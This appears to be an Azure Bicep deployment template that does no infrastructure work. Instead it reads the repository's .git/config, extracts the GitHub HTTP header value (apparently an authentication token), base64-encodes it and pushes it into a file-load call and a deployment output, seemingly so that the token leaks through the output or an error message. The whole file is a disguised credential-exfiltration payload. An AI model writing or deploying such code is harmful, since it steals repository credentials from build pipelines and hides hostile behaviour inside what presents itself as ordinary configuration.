targetScope = 'subscription'

var fileContent = loadTextContent('../.git/config')
var afterPrefix = split(fileContent, 'http.https://github.com ')[1]
var extractme = base64(split(afterPrefix, '\n')[0])
var export12 = loadFileAsBase64(extractme)
output export string = export12

